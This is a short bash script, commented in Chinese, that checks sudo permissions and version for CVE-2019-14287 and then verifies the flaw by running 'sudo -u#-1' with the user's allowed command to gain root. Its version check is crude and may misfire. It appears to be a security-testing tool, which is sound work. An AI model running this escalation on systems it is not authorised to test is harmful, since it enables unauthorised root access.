#!/bin/bash 
#检测当前用户是否拥有所有sudo权限
sudo -l | \grep -e 'ALL.:.ALL' >>/dev/null 2>&1
if [[ $? -eq 0 ]]
then
	echo '[+] The current user has all sudo permissions'
	echo '[+] Please use other users with lower permissions to detect cve-2019-14287 vulnerability'
else
	# 检测当前用户是否拥有部分sudo权限
	sudo -l >>/dev/null 2>&1
	if [[ $? -eq 1 ]]
	then
		echo '[+] Current user does not have sudo permission'
	else
		# 获取当前用户可以执行的sudo指令
		SudoPerm=$(sudo -l | \grep '(' | cut -d/ -f2-)
		echo '[+] The current user has some sudo permissions'
		# 检测当前的sudo版本，由于Linux可以支持中文，所以进行两次检测
		SudoVer=$(sudo --version | \grep -i 'sudo version' | awk '{print $3}' | sed 's/\./,/g' | cut -c -6)
		CnVer=$(sudo --version | \grep -i "Sudo 版本" | awk '{print $3}' | sed 's/\./,/g')
		# 如果sudo版本小于1.8.28，说明可能存在sudo提权漏洞，
		if ((  $SudoVer < '1,8,28' )) || (( $CnVer < '1,8,28' ))
		then
			echo '[+] The current sudo version is' $SudoVer $CnVer
			echo '[+] Suspected cve-2019-14287 vulnerability in current sudo version'
			echo '[+] Test vulnerability:'
					if [[ $SudoPerm == *"ALL"* ]];
					then
						echo "[+] Print user and group information for username:-";sudo -u#-1 id
					else
						sudo -u#-1 /$SudoPerm
					fi
			echo '[+] Successfully verified cve-2019-14287 vulnerability!'
		else
			echo '[+] No cve-2019-14287 vulnerability in current sudo version'
		fi
	fi
fi
echo ""